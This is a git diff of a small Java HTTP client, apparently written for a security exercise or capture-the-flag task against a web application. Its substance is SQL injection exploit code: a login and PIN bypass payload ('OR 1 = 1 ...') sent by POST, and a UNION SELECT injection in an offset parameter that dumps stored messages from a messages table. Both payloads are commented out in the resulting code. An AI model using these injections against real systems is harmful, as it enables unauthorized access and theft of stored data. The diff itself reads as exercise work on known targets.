@@ -1,6 +1,9 @@
+import sun.misc.BASE64Decoder;
+
 import javax.net.ssl.HttpsURLConnection;
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
+import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -44,9 +47,12 @@ public class Main {
 //        }
 
         // pin validation
-        main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '5517' OR '&password=");
-    }
+//        main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '5517' OR '&password=");
 
+        // messages exploit
+//        main.sendGet(APP_URL + "/index.php?offset=1%20UNION%20SELECT%20date_time%2C%20base64_xored_message_with_plain_key%20AS%20message%20FROM%20messages");
+
+    }
 
     // HTTP POST request
     private void sendPost(String url, String body) throws Exception {
@@ -89,9 +95,7 @@ public class Main {
 
 
     // HTTP GET request
-    private void sendGet() throws Exception {
-
-        String url = "http://www.google.com/search?q=mkyong";
+    private void sendGet(String url) throws Exception {
 
         URL obj = new URL(url);
         HttpURLConnection con = (HttpURLConnection) obj.openConnection();
